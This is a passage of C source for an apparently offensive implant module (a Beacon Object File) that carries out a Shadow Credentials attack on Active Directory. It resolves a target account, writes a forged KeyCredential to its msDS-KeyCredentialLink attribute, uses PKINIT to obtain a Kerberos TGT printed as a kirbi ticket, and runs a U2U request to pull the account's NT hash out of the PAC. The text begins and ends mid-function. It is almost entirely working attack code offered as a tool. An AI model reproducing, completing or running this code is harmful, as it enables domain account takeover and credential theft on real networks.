     else { body[bOff++]=0x82;body[bOff++]=(BYTE)(epSeqLen>>8);body[bOff++]=(BYTE)(epSeqLen&0xFF); }
     memcpy(body+bOff,epSeq,epSeqLen);bOff+=epSeqLen;
 
     /* [APPLICATION 22] SEQUENCE */
     BYTE* final=(BYTE*)malloc(bOff+16); int fOff=0;
     final[fOff++]=0x76;
     if (bOff+2<128) final[fOff++]=(BYTE)(bOff+2);
     else { final[fOff++]=0x82;final[fOff++]=(BYTE)((bOff+2)>>8);final[fOff++]=(BYTE)((bOff+2)&0xFF); }
     final[fOff++]=0x30;
     if (bOff<128) final[fOff++]=(BYTE)bOff;
     else { final[fOff++]=0x82;final[fOff++]=(BYTE)(bOff>>8);final[fOff++]=(BYTE)(bOff&0xFF); }
     memcpy(final+fOff,body,bOff);fOff+=bOff;
 
     DWORD b64Len=0;
     CryptBinaryToStringA(final,fOff,CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF,NULL,&b64Len);
     char* b64=(char*)malloc(b64Len+1);
     CryptBinaryToStringA(final,fOff,CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF,b64,&b64Len);
     BeaconPrintf(CALLBACK_OUTPUT,"[+] TGT (kirbi, base64):");
     BeaconPrintf(CALLBACK_OUTPUT,"%s",b64);
 
     free(b64); free(final); free(body); free(epSeq); free(ep); free(a29); free(ecp); free(ci);
 }
 
 /* =============================================================================
  * Phase 7 — U2U TGS-REQ
  * ============================================================================= */
 
 static BYTE* sc_u2u_authenticator(const char* user, const char* realm,
     BYTE* sessKey, int skLen, BYTE* reqBody, int rbLen, int* outLen)
 {
     BYTE buf[4096];
     int off=0;
     SYSTEMTIME st;
     char ts[32];
 
     /* authenticator-vno [0] = 5 */
     int vLen,vTagLen;
     BYTE* v=sc_asn_int(5,&vLen); BYTE* vTag=sc_asn_ctx(0,v,vLen,&vTagLen);
     memcpy(buf+off,vTag,vTagLen);off+=vTagLen;free(v);free(vTag);
 
     /* crealm [1] */
     int rlLen,rlTagLen;
     BYTE* rl=sc_asn_genstr(realm,&rlLen); BYTE* rlTag=sc_asn_ctx(1,rl,rlLen,&rlTagLen);
     memcpy(buf+off,rlTag,rlTagLen);off+=rlTagLen;free(rl);free(rlTag);
 
     /* cname [2] */
     int cnLen,cnTagLen;
     BYTE* cn=sc_krb_principal(1,user,NULL,&cnLen); BYTE* cnTag=sc_asn_ctx(2,cn,cnLen,&cnTagLen);
     memcpy(buf+off,cnTag,cnTagLen);off+=cnTagLen;free(cn);free(cnTag);
 
     /* cksum [3] */
     int cksumLen;
     BYTE* cksumVal=sc_krb_checksum(sessKey,skLen,reqBody,rbLen,KU_TGS_REQ_CKSUM,&cksumLen);
     if (cksumVal) {
         BYTE ck[64]; int ckOff=0;
         int ctLen,ctTagLen;
         BYTE* ct=sc_asn_int(CKSUMTYPE_HMAC_SHA1_96_AES256,&ctLen);
         BYTE* ctTag=sc_asn_ctx(0,ct,ctLen,&ctTagLen);
         memcpy(ck+ckOff,ctTag,ctTagLen);ckOff+=ctTagLen;free(ct);free(ctTag);
         int cvLen,cvTagLen;
         BYTE* cv=sc_asn_octet(cksumVal,cksumLen,&cvLen);
         BYTE* cvTag=sc_asn_ctx(1,cv,cvLen,&cvTagLen);
         memcpy(ck+ckOff,cvTag,cvTagLen);ckOff+=cvTagLen;free(cv);free(cvTag);free(cksumVal);
         int ckSeqLen,ckTagLen;
         BYTE* ckSeq=sc_asn_seq(ck,ckOff,&ckSeqLen);
         BYTE* ckTag=sc_asn_ctx(3,ckSeq,ckSeqLen,&ckTagLen);
         memcpy(buf+off,ckTag,ckTagLen);off+=ckTagLen;free(ckSeq);free(ckTag);
     }
 
     /* cusec [4], ctime [5] */
     GetSystemTime(&st);
     int csLen,csTagLen;
     BYTE* cs=sc_asn_int(st.wMilliseconds*1000,&csLen);
     BYTE* csTag=sc_asn_ctx(4,cs,csLen,&csTagLen);
     memcpy(buf+off,csTag,csTagLen);off+=csTagLen;free(cs);free(csTag);
 
     sprintf(ts,"%04d%02d%02d%02d%02d%02dZ",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);
     int ctLen2,ctTagLen2;
     BYTE* ct2=sc_asn_gtime(ts,&ctLen2);
     BYTE* ctTag2=sc_asn_ctx(5,ct2,ctLen2,&ctTagLen2);
     memcpy(buf+off,ctTag2,ctTagLen2);off+=ctTagLen2;free(ct2);free(ctTag2);
 
     int authSeqLen;
     BYTE* authSeq=sc_asn_seq(buf,off,&authSeqLen);
     BYTE* result=sc_asn_app(2,authSeq,authSeqLen,outLen);
     free(authSeq);
     return result;
 }
 
 static BYTE* sc_u2u_apreq(BYTE* ticket, int tLen, BYTE* encAuth, int eaLen, int* outLen) {
     BYTE* buf=(BYTE*)malloc(tLen+eaLen+256);
     int off=0;
 
     int vLen,vTagLen;
     BYTE* v=sc_asn_int(5,&vLen); BYTE* vTag=sc_asn_ctx(0,v,vLen,&vTagLen);
     memcpy(buf+off,vTag,vTagLen);off+=vTagLen;free(v);free(vTag);
 
     int mLen,mTagLen;
     BYTE* m=sc_asn_int(14,&mLen); BYTE* mTag=sc_asn_ctx(1,m,mLen,&mTagLen);
     memcpy(buf+off,mTag,mTagLen);off+=mTagLen;free(m);free(mTag);
 
     BYTE apOpts[]={0x00,0x00,0x00,0x00};
     int aoLen,aoTagLen;
     BYTE* ao=sc_asn_bits(apOpts,4,&aoLen); BYTE* aoTag=sc_asn_ctx(2,ao,aoLen,&aoTagLen);
     memcpy(buf+off,aoTag,aoTagLen);off+=aoTagLen;free(ao);free(aoTag);
 
     int tkTagLen;
     BYTE* tkTag=sc_asn_ctx(3,ticket,tLen,&tkTagLen);
     memcpy(buf+off,tkTag,tkTagLen);off+=tkTagLen;free(tkTag);
 
     /* authenticator EncryptedData */
     BYTE edBuf[4096]; int edOff=0;
     int etLen,etTagLen;
     BYTE* et=sc_asn_int(ETYPE_AES256,&etLen); BYTE* etTag=sc_asn_ctx(0,et,etLen,&etTagLen);
     memcpy(edBuf+edOff,etTag,etTagLen);edOff+=etTagLen;free(et);free(etTag);
     int cLen,cTagLen;
     BYTE* c=sc_asn_octet(encAuth,eaLen,&cLen); BYTE* cTag=sc_asn_ctx(2,c,cLen,&cTagLen);
     memcpy(edBuf+edOff,cTag,cTagLen);edOff+=cTagLen;free(c);free(cTag);
     int edSeqLen,edTagLen;
     BYTE* edSeq=sc_asn_seq(edBuf,edOff,&edSeqLen);
     BYTE* edTag=sc_asn_ctx(4,edSeq,edSeqLen,&edTagLen);
     memcpy(buf+off,edTag,edTagLen);off+=edTagLen;free(edSeq);free(edTag);
 
     int apSeqLen;
     BYTE* apSeq=sc_asn_seq(buf,off,&apSeqLen);
     free(buf);
     BYTE* result=sc_asn_app(14,apSeq,apSeqLen,outLen);
     free(apSeq);
     return result;
 }
 
 static BYTE* sc_u2u_tgsreq(const char* user, const char* realm,
     BYTE* ticket, int tLen, BYTE* sessKey, int skLen, int* outLen)
 {
     BYTE* rbBuf = (BYTE*)malloc(4096); int rbOff=0;
 
     /* kdc-options: enc-tkt-in-skey */
     BYTE kdcOpts[]={0x40,0x81,0x00,0x18};
     int koLen,koTagLen;
     BYTE* ko=sc_asn_bits(kdcOpts,4,&koLen); BYTE* koTag=sc_asn_ctx(0,ko,koLen,&koTagLen);
     memcpy(rbBuf+rbOff,koTag,koTagLen);rbOff+=koTagLen;free(ko);free(koTag);
 
     int rlLen,rlTagLen;
     BYTE* rl=sc_asn_genstr(realm,&rlLen); BYTE* rlTag=sc_asn_ctx(2,rl,rlLen,&rlTagLen);
     memcpy(rbBuf+rbOff,rlTag,rlTagLen);rbOff+=rlTagLen;free(rl);free(rlTag);
 
     int snLen,snTagLen;
     BYTE* sn=sc_krb_principal(1,user,NULL,&snLen); BYTE* snTag=sc_asn_ctx(3,sn,snLen,&snTagLen);
     memcpy(rbBuf+rbOff,snTag,snTagLen);rbOff+=snTagLen;free(sn);free(snTag);
 
     SYSTEMTIME st; GetSystemTime(&st);
     char till[32];
     sprintf(till,"%04d%02d%02d%02d%02d%02dZ",st.wYear,st.wMonth,st.wDay+1,st.wHour,st.wMinute,st.wSecond);
     int tlLen,tlTagLen;
     BYTE* tl=sc_asn_gtime(till,&tlLen); BYTE* tlTag=sc_asn_ctx(5,tl,tlLen,&tlTagLen);
     memcpy(rbBuf+rbOff,tlTag,tlTagLen);rbOff+=tlTagLen;free(tl);free(tlTag);
 
     int ncLen,ncTagLen;
     BYTE* nc=sc_asn_int(g_nonce+1,&ncLen); BYTE* ncTag=sc_asn_ctx(7,nc,ncLen,&ncTagLen);
     memcpy(rbBuf+rbOff,ncTag,ncTagLen);rbOff+=ncTagLen;free(nc);free(ncTag);
 
     /* etype [8]: AES256 + AES128 + RC4 */
     BYTE etypes[64]; int etLen2=0, eLen;
     BYTE* e1=sc_asn_int(ETYPE_AES256,&eLen);memcpy(etypes+etLen2,e1,eLen);etLen2+=eLen;free(e1);
     BYTE* e2=sc_asn_int(ETYPE_AES128,&eLen);memcpy(etypes+etLen2,e2,eLen);etLen2+=eLen;free(e2);
     BYTE* e3=sc_asn_int(ETYPE_RC4,&eLen);memcpy(etypes+etLen2,e3,eLen);etLen2+=eLen;free(e3);
     int etSeqLen,etTagLen;
     BYTE* etSeq=sc_asn_seq(etypes,etLen2,&etSeqLen);
     BYTE* etTag=sc_asn_ctx(8,etSeq,etSeqLen,&etTagLen);
     memcpy(rbBuf+rbOff,etTag,etTagLen);rbOff+=etTagLen;free(etSeq);free(etTag);
 
     /* additional-tickets [11] = our TGT */
     int atSeqLen,atTagLen;
     BYTE* atSeq=sc_asn_seq(ticket,tLen,&atSeqLen);
     BYTE* atTag=sc_asn_ctx(11,atSeq,atSeqLen,&atTagLen);
     memcpy(rbBuf+rbOff,atTag,atTagLen);rbOff+=atTagLen;free(atSeq);free(atTag);
 
     int rbSeqLen;
     BYTE* rbSeq=sc_asn_seq(rbBuf,rbOff,&rbSeqLen);
 
     int authLen;
     BYTE* auth=sc_u2u_authenticator(user,realm,sessKey,skLen,rbSeq,rbSeqLen,&authLen);
     if (!auth) { free(rbSeq); return NULL; }
 
     int encAuthLen;
     BYTE* encAuth=sc_krb_encrypt(ETYPE_AES256,KU_TGS_REQ_AUTH,sessKey,skLen,auth,authLen,&encAuthLen);
     free(auth);
     if (!encAuth) { free(rbSeq); return NULL; }
 
     int apLen;
     BYTE* ap=sc_u2u_apreq(ticket,tLen,encAuth,encAuthLen,&apLen);
     free(encAuth);
     if (!ap) { free(rbSeq); return NULL; }
 
     /* PA-TGS-REQ */
     BYTE* paBuf  = (BYTE*)malloc(4096); int paOff=0;
     int ptLen,ptTagLen;
     BYTE* pt=sc_asn_int(1,&ptLen); BYTE* ptTag=sc_asn_ctx(1,pt,ptLen,&ptTagLen);
     memcpy(paBuf+paOff,ptTag,ptTagLen);paOff+=ptTagLen;free(pt);free(ptTag);
     int pvLen,pvTagLen;
     BYTE* pv=sc_asn_octet(ap,apLen,&pvLen); BYTE* pvTag=sc_asn_ctx(2,pv,pvLen,&pvTagLen);
     memcpy(paBuf+paOff,pvTag,pvTagLen);paOff+=pvTagLen;free(pv);free(pvTag);free(ap);
 
     int paSeqLen;
     BYTE* paSeq=sc_asn_seq(paBuf,paOff,&paSeqLen);
     int paOutSeqLen;
     BYTE* paOutSeq=sc_asn_seq(paSeq,paSeqLen,&paOutSeqLen);
     free(paSeq);
     int paTagLen;
     BYTE* paTag=sc_asn_ctx(3,paOutSeq,paOutSeqLen,&paTagLen);
     free(paOutSeq);
 
     /* TGS-REQ */
     BYTE* tgsBuf = (BYTE*)malloc(8192); int tgsOff=0;
     int vLen,vTagLen;
     BYTE* v=sc_asn_int(5,&vLen); BYTE* vTag=sc_asn_ctx(1,v,vLen,&vTagLen);
     memcpy(tgsBuf+tgsOff,vTag,vTagLen);tgsOff+=vTagLen;free(v);free(vTag);
     int mLen,mTagLen;
     BYTE* ms=sc_asn_int(KRB_TGS_REQ,&mLen); BYTE* msTag=sc_asn_ctx(2,ms,mLen,&mTagLen);
     memcpy(tgsBuf+tgsOff,msTag,mTagLen);tgsOff+=mTagLen;free(ms);free(msTag);
     memcpy(tgsBuf+tgsOff,paTag,paTagLen);tgsOff+=paTagLen;free(paTag);
     int rbTagLen;
     BYTE* rbTag=sc_asn_ctx(4,rbSeq,rbSeqLen,&rbTagLen);
     memcpy(tgsBuf+tgsOff,rbTag,rbTagLen);tgsOff+=rbTagLen;free(rbTag);free(rbSeq);
 
     int tgsSeqLen;
     BYTE* tgsSeq=sc_asn_seq(tgsBuf,tgsOff,&tgsSeqLen);
     BYTE* result=sc_asn_app(KRB_TGS_REQ,tgsSeq,tgsSeqLen,outLen);
     free(tgsSeq);
     free(paBuf);
     free(tgsBuf);
     return result;
 }
 
 /* =============================================================================
  * Phase 8 — TGS-REP / PAC parsing
  * ============================================================================= */
 
 static BYTE* sc_tgsrep_encpart(BYTE* buf, int len, int* cLen) {
     int off=0, length;
     if (buf[off]==0x6D) { off++; off+=sc_der_len_dec(buf,off,&length); }
     if (buf[off]==0x30) { off++; off+=sc_der_len_dec(buf,off,&length); }
 
     while (off < len-10) {
         if (buf[off]==0xA5) {
             off++; off+=sc_der_len_dec(buf,off,&length);
             int ticketEnd=off+length;
             if (buf[off]==0x61) { off++; off+=sc_der_len_dec(buf,off,&length); }
             if (buf[off]==0x30) { off++; off+=sc_der_len_dec(buf,off,&length); }
             while (off < ticketEnd-10) {
                 if (buf[off]==0xA3) {
                     off++; off+=sc_der_len_dec(buf,off,&length);
                     if (buf[off]==0x30) {
                         off++; int edLen; off+=sc_der_len_dec(buf,off,&edLen);
                         int edEnd=off+edLen;
                         while (off<edEnd) {
                             if (buf[off]==0xA2) {
                                 off++; off+=sc_der_len_dec(buf,off,&length);
                                 if (buf[off]==0x04) {
                                     off++; off+=sc_der_len_dec(buf,off,cLen);
                                     BYTE* r=(BYTE*)malloc(*cLen);
                                     memcpy(r,buf+off,*cLen);
                                     return r;
                                 }
                             } else if ((buf[off]&0xE0)==0xA0) {
                                 int sl; off++; off+=sc_der_len_dec(buf,off,&sl); off+=sl;
                             } else off++;
                         }
                     }
                     break;
                 } else if ((buf[off]&0xE0)==0xA0) {
                     int sl; off++; off+=sc_der_len_dec(buf,off,&sl); off+=sl;
                 } else off++;
             }
             break;
         } else if ((buf[off]&0xE0)==0xA0) {
             int sl; off++; off+=sc_der_len_dec(buf,off,&sl); off+=sl;
         } else off++;
     }
     *cLen=0; return NULL;
 }
 
 static BYTE* sc_authdata_pac(BYTE* data, int dLen, int* pacLen);
 
 static BYTE* sc_ticket_pac(BYTE* encTkt, int eLen, int* pacLen) {
     int off=0, length;
     if (encTkt[off]==0x63) { off++; off+=sc_der_len_dec(encTkt,off,&length); }
     if (encTkt[off]==0x30) { off++; off+=sc_der_len_dec(encTkt,off,&length); }
     while (off < eLen-10) {
         if (encTkt[off]==0xAA) {
             off++; int adLen; off+=sc_der_len_dec(encTkt,off,&adLen);
             return sc_authdata_pac(encTkt+off, adLen, pacLen);
         } else if ((encTkt[off]&0xE0)==0xA0) {
             int sl; off++; off+=sc_der_len_dec(encTkt,off,&sl); off+=sl;
         } else off++;
     }
     *pacLen=0; return NULL;
 }
 
 static BYTE* sc_authdata_pac(BYTE* data, int dLen, int* pacLen) {
     int off=0, length;
     if (data[off]==0x30) { off++; off+=sc_der_len_dec(data,off,&length); }
     while (off < dLen-5) {
         if (data[off]==0x30) {
             off++; int eLen; off+=sc_der_len_dec(data,off,&eLen);
             int eEnd=off+eLen;
             int adType=-1; BYTE* adData=NULL; int adDataLen=0;
             while (off < eEnd) {
                 if (data[off]==0xA0) {
                     off++; off+=sc_der_len_dec(data,off,&length);
                     if (data[off]==0x02) {
                         int il=data[off+1]; off+=2; adType=0;
                         int i; for (i=0;i<il;i++) adType=(adType<<8)|data[off++];
                     }
                 } else if (data[off]==0xA1) {
                     off++; off+=sc_der_len_dec(data,off,&length);
                     if (data[off]==0x04) {
                         off++; off+=sc_der_len_dec(data,off,&adDataLen);
                         adData=data+off; off+=adDataLen;
                     }
                 } else off++;
             }
             if (adType==1 && adData) {
                 BYTE* r=sc_authdata_pac(adData,adDataLen,pacLen);
                 if (r) return r;
             } else if (adType==128 && adData) {
                 BYTE* r=(BYTE*)malloc(adDataLen);
                 memcpy(r,adData,adDataLen);
                 *pacLen=adDataLen; return r;
             }
             off=eEnd;
         } else off++;
     }
     *pacLen=0; return NULL;
 }
 
 /*
  * NTLM_SUPPLEMENTAL_CREDENTIAL layout (MS-PAC §2.6.3):
  *   Version  DWORD  (= 0)
  *   Flags    DWORD  (NtPasswordPresent=0x1, LmPasswordPresent=0x2)
  *   LmOwf    BYTE[16]
  *   NtOwf    BYTE[16]
  */
 typedef struct {
     DWORD Version;
     DWORD Flags;
     BYTE  LmOwf[16];
     BYTE  NtOwf[16];
 } SC_NTLM_CRED;
 
 static void sc_pac_extract_hash(BYTE* data, int dLen) {
     int i, j;
     if (dLen < 8) return;
 
     /* Locate NTLM package by Unicode marker N\0T\0L\0M\0 */
     for (i = 0; i < dLen - 44; i++) {
         if (data[i]=='N' && data[i+1]==0 && data[i+2]=='T' && data[i+3]==0 &&
             data[i+4]=='L' && data[i+5]==0 && data[i+6]=='M' && data[i+7]==0) {
             /* Scan forward for a valid NTLM_SUPPLEMENTAL_CREDENTIAL */
             for (j = i + 8; j + (int)sizeof(SC_NTLM_CRED) <= dLen; j++) {
                 SC_NTLM_CRED* c = (SC_NTLM_CRED*)(data + j);
                 if (c->Version == 0 && c->Flags > 0 && c->Flags < 0x10) {
                     int hasData=0, k;
                     for (k=0;k<16;k++) if (c->NtOwf[k]) hasData=1;
                     if (hasData) {
                         BeaconPrintf(CALLBACK_OUTPUT,
                             "[+] NT Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                             c->NtOwf[0],c->NtOwf[1],c->NtOwf[2],c->NtOwf[3],
                             c->NtOwf[4],c->NtOwf[5],c->NtOwf[6],c->NtOwf[7],
                             c->NtOwf[8],c->NtOwf[9],c->NtOwf[10],c->NtOwf[11],
                             c->NtOwf[12],c->NtOwf[13],c->NtOwf[14],c->NtOwf[15]);
                         return;
                     }
                 }
             }
         }
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "[!] NT hash not found in PAC_CREDENTIAL_DATA");
 }
 
 static void sc_pac_process(BYTE* pac, int pacLen, BYTE* replyKey, int rkLen) {
     if (pacLen < 8) { BeaconPrintf(CALLBACK_OUTPUT,"[!] PAC too small"); return; }
     DWORD cBuffers = *(DWORD*)pac;
     int off = 8;
     DWORD i;
     for (i = 0; i < cBuffers && off+16 <= pacLen; i++, off+=16) {
         DWORD  ulType  = *(DWORD*)(pac+off);
         DWORD  cbBuf   = *(DWORD*)(pac+off+4);
         ULONGLONG bufOff = *(ULONGLONG*)(pac+off+8);
         if (ulType != 2) continue;
         if (bufOff + cbBuf > (ULONGLONG)pacLen || cbBuf < 8) continue;
         BYTE* ci    = pac + bufOff;
         DWORD etype = *(DWORD*)(ci+4);
         BYTE* enc   = ci + 8;
         int   encLen= cbBuf - 8;
         int   decLen;
         BYTE* dec   = sc_krb_decrypt(etype, KU_PAC_CREDENTIAL, replyKey, rkLen, enc, encLen, &decLen);
         if (dec) { sc_pac_extract_hash(dec, decLen); free(dec); }
         else BeaconPrintf(CALLBACK_OUTPUT, "[!] PAC_CREDENTIAL_INFO decryption failed");
     }
 }
 
 /* =============================================================================
  * Phase 8 — error description lookup
  * ============================================================================= */
 
 static const char* sc_krb_errstr(int code) {
     switch (code) {
     case 6:  return "KDC_ERR_C_PRINCIPAL_UNKNOWN";
     case 7:  return "KDC_ERR_S_PRINCIPAL_UNKNOWN";
     case 14: return "KDC_ERR_ETYPE_NOSUPP";
     case 18: return "KDC_ERR_CLIENT_REVOKED";
     case 24: return "KDC_ERR_PREAUTH_FAILED";
     case 25: return "KDC_ERR_PREAUTH_REQUIRED";
     case 29: return "KDC_ERR_SVC_UNAVAILABLE";
     case 37: return "KRB_AP_ERR_SKEW";
     case 68: return "KDC_ERR_WRONG_REALM";
     default: return "unknown";
     }
 }
 
 /* =============================================================================
  * Phase 7+8 — U2U entry point
  * ============================================================================= */
 
 static void sc_u2u_run(const char* kdc, const char* user, const char* realm,
     BYTE* ticket, int tLen, BYTE* sessKey, int skLen,
     BYTE* replyKey, int rkLen)
 {
     BeaconPrintf(CALLBACK_OUTPUT, "[*] U2U TGS-REQ for NT hash...");
     int reqLen;
     BYTE* req = sc_u2u_tgsreq(user, realm, ticket, tLen, sessKey, skLen, &reqLen);
     if (!req) { BeaconPrintf(CALLBACK_OUTPUT, "[!] U2U TGS-REQ build failed"); return; }
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Sending U2U TGS-REQ (%d bytes)", reqLen);
     int repLen;
     BYTE* rep = sc_kdc_send(kdc, 88, req, reqLen, &repLen);
     free(req);
     if (!rep) { BeaconPrintf(CALLBACK_OUTPUT, "[!] No response from KDC"); return; }
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Received TGS-REP (%d bytes)", repLen);
 
     if (rep[0] == 0x7E) {
         int ec=-1, i;
         for (i=0; i<repLen-5; i++) {
             if (rep[i]==0xA6 && rep[i+2]==0x02) {
                 ec=0; int el=rep[i+3], j;
                 for (j=0;j<el;j++) ec=(ec<<8)|rep[i+4+j];
                 break;
             }
         }
         BeaconPrintf(CALLBACK_OUTPUT, "[!] KRB-ERROR %d: %s", ec, sc_krb_errstr(ec));
         free(rep); return;
     }
 
     if (rep[0] != 0x6D) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Unexpected TGS-REP type: 0x%02X", rep[0]);
         free(rep); return;
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] U2U TGS-REP received");
 
     int encLen;
     BYTE* enc = sc_tgsrep_encpart(rep, repLen, &encLen);
     free(rep);
     if (!enc) { BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract ticket enc-part"); return; }
 
     int decLen;
     BYTE* dec = sc_krb_decrypt(ETYPE_AES256, KU_TICKET_ENCPART, sessKey, skLen, enc, encLen, &decLen);
     free(enc);
     if (!dec) { BeaconPrintf(CALLBACK_OUTPUT, "[!] Ticket enc-part decryption failed"); return; }
 
     int pacLen;
     BYTE* pac = sc_ticket_pac(dec, decLen, &pacLen);
     free(dec);
     if (!pac) { BeaconPrintf(CALLBACK_OUTPUT, "[!] PAC not found in EncTicketPart"); return; }
 
     sc_pac_process(pac, pacLen, replyKey, rkLen);
     free(pac);
 }
 
 /* =============================================================================
  * Phase 6 — AS-REP main handler
  * ============================================================================= */
 
 static void sc_asrep_process(BYTE* rep, int repLen, PCCERT_CONTEXT pCert,
     const char* user, const char* realm, const char* kdc)
 {
     if (rep[0] == 0x7E) {
         int ec=-1, i;
         for (i=0; i<repLen-5; i++) {
             if (rep[i]==0xA6 && rep[i+2]==0x02) {
                 ec=0; int el=rep[i+3], j;
                 for (j=0;j<el;j++) ec=(ec<<8)|rep[i+4+j];
                 break;
             }
         }
         BeaconPrintf(CALLBACK_OUTPUT, "[!] KRB-ERROR %d: %s", ec, sc_krb_errstr(ec));
         return;
     }
     if (rep[0] != 0x6B) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Unexpected AS-REP type: 0x%02X", rep[0]);
         return;
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] PKINIT AS-REP received");
 
     int kdcPubLen;
     BYTE* kdcPub = sc_parse_dh_pubkey(rep, repLen, &kdcPubLen);
     if (!kdcPub) { BeaconPrintf(CALLBACK_OUTPUT, "[!] KDC DH public key not found"); return; }
 
     int nonceLen;
     BYTE* nonce = sc_parse_dh_nonce(rep, repLen, &nonceLen);
 
     /* Shared secret = KDC_pub ^ our_priv mod p */
     SC_BIGINT p, y, x, ss;
     BYTE ssBytes[128];
     bi_from_bytes(&p, SC_DH_P, sizeof(SC_DH_P));
     bi_from_bytes(&y, kdcPub, kdcPubLen);
     bi_from_bytes(&x, g_dh_priv, sizeof(g_dh_priv));
     bi_modpow(&ss, &y, &x, &p);
     bi_to_bytes(&ss, ssBytes, 128);
 
     BYTE replyKey[32];
     sc_dh_derive_key(ssBytes, 128, nonce, nonceLen, replyKey, 32);
     memcpy(g_reply_key, replyKey, 32);
 
     int epLen;
     BYTE* ep = sc_parse_encpart(rep, repLen, &epLen);
     if (!ep) { BeaconPrintf(CALLBACK_OUTPUT, "[!] enc-part not found"); goto done_asrep; }
 
     int decLen;
     BYTE* dec = sc_krb_decrypt(ETYPE_AES256, KU_AS_REP_ENCPART, replyKey, 32, ep, epLen, &decLen);
     free(ep);
     if (!dec) { BeaconPrintf(CALLBACK_OUTPUT, "[!] enc-part decryption failed"); goto done_asrep; }
 
     int skLen, skType;
     BYTE* sk = sc_parse_session_key(dec, decLen, &skLen, &skType);
     free(dec);
     if (!sk) { BeaconPrintf(CALLBACK_OUTPUT, "[!] Session key not found"); goto done_asrep; }
     memcpy(g_session_key, sk, skLen);
 
     /* Output TGT */
     {
         int tgtLen;
         BYTE* tgt = sc_parse_ticket(rep, repLen, &tgtLen);
         if (tgt && tgtLen > 0) {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] TGT obtained");
             sc_output_kirbi(tgt, tgtLen, sk, skLen, skType, user, realm);
             free(tgt);
         }
     }
 
     /* U2U fallback for NT hash */
     {
         int tgtLen;
         BYTE* tgt = sc_parse_ticket(rep, repLen, &tgtLen);
         if (tgt && tgtLen > 0) {
             sc_u2u_run(kdc, user, realm, tgt, tgtLen, sk, skLen, replyKey, 32);
             free(tgt);
         }
     }
 
     free(sk);
 
 done_asrep:
     free(kdcPub);
     if (nonce) free(nonce);
 }
 
 /* =============================================================================
  * DC discovery
  * ============================================================================= */
 
 static void sc_kdc_lookup(const char* domain, char* out, int outLen) {
     WCHAR wDomain[256];
     PDOMAIN_CONTROLLER_INFOW dci = NULL;
     MultiByteToWideChar(CP_ACP, 0, domain, -1, wDomain, 256);
     if (DsGetDcNameW(NULL, wDomain, NULL, NULL, DS_IS_DNS_NAME|DS_RETURN_DNS_NAME, &dci) == ERROR_SUCCESS) {
         WideCharToMultiByte(CP_ACP, 0, dci->DomainControllerName+2, -1, out, outLen, NULL, NULL);
         NetApiBufferFree(dci);
     } else {
         strcpy(out, domain);
     }
 }
 
 /* =============================================================================
  * Entry point
  * ============================================================================= */
 
 #ifdef BOF
 void go(char* args, int alen) {
 #else
 int main(int argc, char* argv[]) {
     char* args = NULL; int alen = 0;
 #endif
     char* szTarget = NULL;
     char* szDomain = NULL;
     char* szKdc    = NULL;
     WCHAR targetDN[512] = { 0 };
     BYTE* pbSID = NULL;
     DWORD dwSIDLen = 0;
     char  sidStr[128] = { 0 };
     BYTE* pubKey = NULL;
     int   pubKeyLen = 0;
     BYTE* pfx = NULL;
     int   pfxLen = 0;
     BYTE* blob = NULL;
     int   blobLen = 0;
     GUID  devId;
     char  kdcBuf[256] = { 0 };
 
 #ifdef BOF
     datap parser;
     BeaconDataParse(&parser, args, alen);
     szTarget = BeaconDataExtract(&parser, NULL);
     szDomain = BeaconDataExtract(&parser, NULL);
     szKdc    = BeaconDataExtract(&parser, NULL);
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Shadow Credentials — %s@%s", szTarget, szDomain);
 #else
     if (argc < 3) {
         printf("Usage: add-shadowcredentials <target> <domain> [kdc]\n");
         return 1;
     }
     szTarget = argv[1]; szDomain = argv[2];
     szKdc = argc > 3 ? argv[3] : NULL;
 #endif
 
     if (!szTarget || !szTarget[0] || !szDomain || !szDomain[0]) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Usage: acl-shadow <target> <domain> [kdc]");
 #ifndef BOF
         return 1;
 #else
         return;
 #endif
     }
 
     /* Save domain for cleanup */
     {
         int i;
         for (i=0; i<255 && szDomain[i]; i++) g_domain[i] = szDomain[i];
         g_domain[i] = '\0';
     }
 
     CoInitializeEx(NULL, 0);
 
     /* Phase 1: resolve target */
     if (!sc_ldap_lookup(szTarget, szDomain, targetDN, 512, &pbSID, &dwSIDLen)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Target lookup failed"); goto cleanup;
     }
     wcscpy(g_target_dn, targetDN);
 
     if (pbSID && dwSIDLen > 0) {
         LPSTR pszSid = NULL;
         if (ConvertSidToStringSidA((PSID)pbSID, &pszSid)) {
             strcpy(sidStr, pszSid);
             LocalFree(pszSid);
         }
     }
 
     /* Phase 2+3: generate keypair and certificate */
     {
         int certLen = 0;
         pubKey = sc_cert_generate(szTarget, szDomain, sidStr,
             &pubKey, &pubKeyLen, &pfx, &pfxLen, &devId);
         if (!pubKey || !pfx) {
             BeaconPrintf(CALLBACK_OUTPUT, "[!] Certificate generation failed"); goto cleanup;
         }
     }
     memcpy(&g_device_id, &devId, sizeof(GUID));
 
     /* Phase 2: build KeyCredential blob */
     blob = sc_keycred_build(pubKey, pubKeyLen, &devId, &blobLen);
     if (!blob) { BeaconPrintf(CALLBACK_OUTPUT, "[!] KeyCredential blob build failed"); goto cleanup; }
 
     /* Phase 4: write msDS-KeyCredentialLink */
     if (!sc_ldap_write(szDomain, targetDN, blob, blobLen)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] msDS-KeyCredentialLink write failed"); goto cleanup;
     }
     BeaconPrintf(CALLBACK_OUTPUT,
         "[+] KeyCredential written (DeviceId: %08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X)",
         devId.Data1, devId.Data2, devId.Data3,
         devId.Data4[0], devId.Data4[1], devId.Data4[2], devId.Data4[3],
         devId.Data4[4], devId.Data4[5], devId.Data4[6], devId.Data4[7]);
 
     /* Output PFX */
     {
